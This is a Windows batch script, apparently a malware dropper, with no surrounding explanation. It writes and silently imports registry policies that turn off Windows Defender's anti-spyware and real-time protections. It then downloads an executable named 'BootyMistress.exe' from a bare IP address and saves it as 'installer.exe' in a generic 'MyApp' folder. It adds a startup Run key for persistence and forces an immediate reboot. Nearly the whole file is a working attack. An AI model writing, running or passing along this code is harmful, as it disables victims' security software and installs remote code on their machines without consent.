@echo off
REM Define the log file path
set LOGFILE=%TEMP%\script_log.txt

REM Redirect all output to the log file
(
    echo Windows Registry Editor Version 5.00
    echo.
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
    echo "DisableAntiSpyware"=dword:00000001
    echo "DisableRealtimeMonitoring"=dword:00000001
    echo.
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
    echo "DisableBehaviorMonitoring"=dword:00000001
    echo "DisableOnAccessProtection"=dword:00000001
    echo "DisableScanOnRealtimeEnable"=dword:00000001
) > "%TEMP%\disable_defender.reg"

REM Import the registry settings to disable Windows Defender
regedit.exe /s "%TEMP%\disable_defender.reg"
if %errorlevel% neq 0 (
    echo Failed to disable Windows Defender. >> "%LOGFILE%"
) else (
    echo Windows Defender disabled successfully. >> "%LOGFILE%"
)

REM Function to download a file silently
powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/BootyMistress.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
if %errorlevel% neq 0 (
    echo Failed to download the file. >> "%LOGFILE%"
) else (
    echo Downloaded file to %TEMP%\installer.exe. >> "%LOGFILE%"
)

REM Create a directory in Program Files if it doesn't exist
if not exist "C:\Program Files\MyApp" (
    mkdir "C:\Program Files\MyApp"
)

REM Move the downloaded file to Program Files
move /Y "%TEMP%\installer.exe" "C:\Program Files\MyApp\installer.exe"
if %errorlevel% neq 0 (
    echo Failed to move installer.exe to Program Files. >> "%LOGFILE%"
) else (
    echo Moved installer.exe to Program Files. >> "%LOGFILE%"
)

REM Create a registry entry to run the executable at startup
(
    echo Windows Registry Editor Version 5.00
    echo.
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
    echo "MyApp"="\"C:\\Program Files\\MyApp\\installer.exe\""
) > "%TEMP%\run_at_startup.reg"

REM Import the registry settings to add startup entry
regedit.exe /s "%TEMP%\run_at_startup.reg"
if %errorlevel% neq 0 (
    echo Failed to register installer.exe to run at startup. >> "%LOGFILE%"
) else (
    echo Registered installer.exe to run at startup. >> "%LOGFILE%"
)

REM Restart the computer
shutdown /r /t 0
if %errorlevel% neq 0 (
    echo Failed to restart the computer. >> "%LOGFILE%"
) else (
    echo Computer restarting... >> "%LOGFILE%"
)

REM Display completion message
echo Script execution completed. >> "%LOGFILE%"
echo Script execution completed.
